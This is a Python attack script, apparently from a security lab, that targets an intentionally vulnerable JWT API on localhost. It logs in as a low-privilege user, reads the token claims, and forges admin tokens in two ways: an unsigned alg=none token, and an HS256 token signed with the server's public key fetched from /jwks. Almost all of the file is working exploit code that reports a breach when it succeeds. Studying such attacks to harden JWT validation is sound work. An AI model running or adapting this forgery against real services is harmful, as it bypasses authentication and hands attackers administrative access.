#!/usr/bin/env python3
"""
Attack: Algorithm Confusion (alg=none AND RS256 -> HS256)
Target: System 5 vulnerable JWT API (http://localhost:5008)
Demonstrates: Forging an admin token with no knowledge of the private key,
              breaking token integrity and escalating user -> admin.
Reference: RFC 8725 s2.1 (Weak Signatures / Insufficient Validation); CVE-2015-9235

Two variants, both succeed because the server trusts the token's own "alg" header.
"""

import base64
import json
import requests

TARGET = "http://localhost:5008"


def b64url(obj):
    raw = json.dumps(obj, separators=(",", ":")).encode()
    return base64.urlsafe_b64encode(raw).rstrip(b"=").decode()


def main():
    print("[*] Attack: JWT algorithm confusion")
    print("[*] Target:", TARGET)

    # Recon: log in as a LOW-privilege user to see the payload shape.
    r = requests.post(f"{TARGET}/login",
                      json={"username": "alice", "password": "password123"})
    alice_tok = r.json()["access_token"]
    payload = json.loads(base64.urlsafe_b64decode(
        alice_tok.split(".")[1] + "=="))
    print("[*] Recovered alice's claims (role=%s)" % payload["role"])

    # The forged claim set: same identity shape, role escalated to admin.
    forged = dict(payload, role="admin", sub="alice")

    # ---- Variant A: alg=none -------------------------------------------------
    # Strip the signature entirely. Header says "none", server obeys.
    none_token = b64url({"alg": "none", "typ": "JWT"}) + "." + b64url(forged) + "."
    a = requests.get(f"{TARGET}/api/admin",
                     headers={"Authorization": f"Bearer {none_token}"})
    print(f"\n[A] alg=none forgery  -> HTTP {a.status_code}")
    if a.status_code == 200:
        print("    [+] BREACH:", a.json()["message"], "->", a.json()["data"])

    # ---- Variant B: RS256 -> HS256 ------------------------------------------
    # Fetch the server's PUBLIC key (published, as JWKS endpoints are).
    pub_pem = requests.get(f"{TARGET}/jwks").content
    print("\n[B] Fetched server public key from /jwks (%d bytes)" % len(pub_pem))
    # PyJWT refuses to use a PEM as an HMAC secret (its own guard), so a real
    # attacker forges the HS256 token by hand. The public key from /jwks IS the
    # HMAC secret the naive server verifies against.
    import hmac as _hmac, hashlib as _hashlib
    hdr = b64url({"alg": "HS256", "typ": "JWT"})
    pl = b64url(forged)
    signing_input = f"{hdr}.{pl}".encode()
    sig = base64.urlsafe_b64encode(
        _hmac.new(pub_pem, signing_input, _hashlib.sha256).digest()).rstrip(b"=").decode()
    hs_token = f"{hdr}.{pl}.{sig}"
    b = requests.get(f"{TARGET}/api/admin",
                     headers={"Authorization": f"Bearer {hs_token}"})
    print(f"[B] RS256->HS256 forgery -> HTTP {b.status_code}")
    if b.status_code == 200:
        print("    [+] BREACH:", b.json()["message"], "->", b.json()["data"])

    if a.status_code == 200 and b.status_code == 200:
        print("\n[+] Attack succeeded. Attacker gained: full admin access via two")
        print("    independent forgeries, neither requiring the signing key.")


if __name__ == "__main__":
    main()
